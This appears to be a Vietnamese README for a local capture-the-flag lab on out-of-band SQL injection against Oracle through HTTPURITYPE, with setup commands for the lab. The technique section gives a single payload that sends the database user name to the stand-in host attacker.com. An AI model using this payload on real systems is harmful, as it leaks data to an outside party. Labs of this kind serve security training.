# SQLi-040: Oracle OOB HTTP via HTTPURITYPE

## 🎯 Mục Tiêu

Khai thác Out-of-Band SQL Injection trên Oracle bằng `HTTPURITYPE` object.

## 📝 Mô Tả

**Scenario:** Legacy system với Oracle database. HTTPURITYPE được phép sử dụng.

**URL:** `http://localhost:5040/invoice?id=1`

## 🎓 Kỹ Thuật

```sql
SELECT HTTPURITYPE('http://attacker.com/'||(SELECT user FROM dual)).GETCLOB() FROM dual
```

## 🚀 Run Lab

```bash
docker-compose up -d
curl http://localhost:5040/invoice?id=1
```

## 🏁 Flag: `FLAG{...}`
